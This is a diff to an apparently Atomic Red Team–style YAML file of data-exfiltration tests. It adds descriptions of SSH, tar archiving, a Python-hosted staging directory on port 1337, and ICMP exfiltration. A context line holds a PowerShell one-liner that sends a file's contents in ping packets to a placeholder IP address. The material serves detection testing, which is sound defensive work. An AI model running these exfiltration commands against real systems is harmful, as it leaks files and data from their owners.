@@ -9,6 +9,8 @@ atomic_tests:
 
     Remote to Local
 
+    Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
+
   supported_platforms:
     - macos
     - linux
@@ -30,6 +32,8 @@ atomic_tests:
     Input a domain and test Exfiltration over SSH
 
     Local to Remote
+
+    Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
 
   supported_platforms:
     - macos
@@ -59,6 +63,8 @@ atomic_tests:
   description: |
     A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
 
+    Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
+
   supported_platforms:
     - macos
     - linux
@@ -84,6 +90,8 @@ atomic_tests:
   description: |
     Exfiltration of specified file over ICMP protocol.
 
+    Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.
+
   supported_platforms:
     - windows
 
@@ -103,11 +111,9 @@ atomic_tests:
     command: |
       $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
 
-
 - name: Exfiltration Over Alternative Protocol - DNS
   description: |
     Exfiltration of specified file over DNS protocol.
-
   supported_platforms:
     - linux
 
